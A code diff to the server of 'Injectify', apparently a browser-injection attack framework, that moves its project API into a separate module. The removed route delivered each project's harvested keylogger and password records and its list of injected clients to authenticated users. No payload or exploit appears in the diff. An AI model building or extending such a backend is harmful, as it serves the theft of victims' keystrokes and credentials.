@@ -1,4 +1,5 @@
 /* eslint-disable prefer-promise-reject-errors */
+declare const global: any
 
 const MongoClient = require('mongodb').MongoClient
 const fs = require('fs-extra')
@@ -48,7 +49,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
   if (err) throw err
   const db = client.db('injectify')
   const api = new apiLoader(db)
-  let inject = require('./src/inject/server.js')(server, db)
+  let inject = global.inject = require('./src/inject/server.js')(server, db)
 
   io.on('connection', socket => {
     let globalToken
@@ -1644,162 +1645,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
   /**
    * Project API
    */
-  app.get('/api/*', apiLimiter, (req, res) => {
-    var getAPI = (name, token, type) => {
-      return new Promise((resolve, reject) => {
-        request({
-          url: 'https://api.github.com/user?access_token=' + encodeURIComponent(token),
-          method: 'GET',
-          headers: {
-            'Accept': 'application/json',
-            'User-Agent': 'Injectify'
-          }
-        }, (error, response, user) => {
-          try {
-            user = JSON.parse(user)
-          } catch (e) {
-            console.error(e)
-            reject({
-              title: 'Could not authenticate you',
-              message: 'Failed to parse the GitHub user API response'
-            })
-          }
-          if (!error && response.statusCode === 200 && user.login) {
-            db.collection('projects', (err, projects) => {
-              if (err) throw err
-              if (config.superusers.includes(user.id)) {
-                projects.findOne({
-                  'name': name
-                }).then(doc => {
-                  if (doc !== null) {
-                    resolve({
-                      json: doc,
-                      user: user
-                    })
-                  } else {
-                    reject({
-                      title: 'Access denied',
-                      message: 'Project ' + name + " doesn't exist!"
-                    })
-                  }
-                })
-              } else {
-                projects.findOne({
-                  $or: [{
-                      'permissions.owners': user.id
-                    },
-                    {
-                      'permissions.admins': user.id
-                    },
-                    {
-                      'permissions.readonly': user.id
-                    }
-                  ],
-                  $and: [{
-                    'name': name
-                  }]
-                }).then(doc => {
-                  if (doc !== null) {
-                    resolve({
-                      json: doc,
-                      user: user
-                    })
-                  } else {
-                    reject({
-                      title: 'Access denied',
-                      message: "You don't have permission to access project " + name
-                    })
-                  }
-                })
-              }
-            })
-          } else {
-            reject({
-              title: 'Could not authenticate you',
-              message: 'GitHub API rejected token!'
-            })
-          }
-        })
-      })
-    }
-
-    let token = req.query.token
-    let project = decodeURIComponent(req.path.split('/')[3])
-    let type = req.path.split('/')[2]
-
-    if (project && token && (type === 'keylogger' || type === 'passwords' || type === 'inject')) {
-      getAPI(project, token, type).then(data => {
-        let json = data.json
-        let user = data.user
-        let stringified
-
-        res.setHeader('Content-Disposition', 'filename="Injectify_API_' + json.name + '.json"')
-        if (typeof req.query.download === 'string') {
-          res.setHeader('Content-Type', 'application/octet-stream')
-        } else {
-          res.setHeader('Content-Type', 'application/json')
-        }
-
-        if (type === 'inject') {
-          if (inject.clients[json._id]) {
-            stringified = JSON.stringify({
-              inject: json.inject,
-              clients: inject.clients[json._id]
-            }, null, '    ')
-            res.send(stringified)
-          } else {
-            stringified = JSON.stringify([], null, '    ')
-            res.status(206).send(stringified)
-          }
-        } else if (json.passwords && json.keylogger) {
-          if (type === 'keylogger') {
-            json = json.keylogger
-          } else {
-            json = json.passwords
-          }
-          stringified = JSON.stringify(json, null, '    ')
-          if (!json || !json.length) {
-            res.status(206).send(stringified)
-          } else {
-            res.send(stringified)
-          }
-        } else {
-          res.status(500).send(JSON.stringify({
-            title: 'Database error',
-            message: 'An internal error occured whilst handling your request'
-          }, null, '    '))
-          return
-        }
-
-        console.log(
-          chalk.greenBright('[API/JSON] ') +
-          chalk.yellowBright('delivered ') +
-          chalk.magentaBright(project) +
-          chalk.redBright(' (length=' + stringified.length + ') ') +
-          chalk.yellowBright('to ') +
-          chalk.magentaBright(user.login) +
-          chalk.redBright(' (' + user.id + ') ')
-        )
-      }).catch(error => {
-        res.setHeader('Content-Type', 'application/json')
-        res.status(403).send(JSON.stringify(error, null, '    '))
-      })
-    } else if (token) {
-      res.setHeader('Content-Type', 'application/json')
-      res.status(400).send(JSON.stringify({
-        title: 'Bad request',
-        message: 'Specify the project name to return in request',
-        format: '/api/TYPE/PROJECT_NAME?token=' + token
-      }, null, '    '))
-    } else {
-      res.setHeader('Content-Type', 'application/json')
-      res.status(400).send(JSON.stringify({
-        title: 'Bad request',
-        message: 'Specify the type, project name & token to return in request',
-        format: '/api/TYPE/PROJECT_NAME?token=GITHUB_TOKEN'
-      }, null, '    '))
-    }
-  })
+  app.get('/api/*', apiLimiter, (req, res) => api.json(req, res))
 
   if (config.dev) {
     // Proxy through to webpack-dev-server if in development mode
